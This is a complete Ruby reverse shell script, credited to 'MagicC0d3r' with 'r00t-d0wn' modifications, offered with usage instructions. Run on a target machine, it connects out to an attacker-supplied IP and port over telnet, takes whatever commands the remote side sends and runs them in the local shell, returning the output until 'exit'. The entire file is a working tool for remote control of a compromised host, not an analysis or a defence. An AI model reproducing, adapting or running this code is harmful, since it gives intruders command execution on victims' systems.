#!/usr/bin/env ruby
#         Ruby Reverse Shell
#        MagicC0d3r@gmail.com
#    www.magiccoder.ir    www.sun-army.org
#      License : GNU General Public License (GPL)
#Usage    : ruby reverse.rb IP PORT
#Example: ruby reverse.rb 127.0.0.1 1370


require 'net/telnet'

if (ARGV[1] == nil)
    puts "\n\t    MagicC0d3r Ruby Reverse Shell\n\tw/ mods for r00t-d0wn by Hood3dRob1n\n"
    puts "\nUsage\t: ruby reverse.rb <ip> <port>\nExample\t: ruby reverse.rb 127.0.0.1 1370\n\n"
else
    server = Net::Telnet::new('Host'=>ARGV[0],'Port'=>ARGV[1].to_i,'Timeout'=>300)
    server.puts "\n\t    MagicC0d3r Ruby Reverse Shell\n\tw/ mods for r00t-d0wn by Hood3dRob1n\n"
    puts "Connected to #{ARGV[0]}:#{ARGV[1].to_i}" 
    loop do
        server.print "[r00t-d0wn]$cmd> "
        command = server.gets
        break if command.chomp == "exit"
        server.print `#{command.to_s}`
    end
    puts "Disconnected"
end
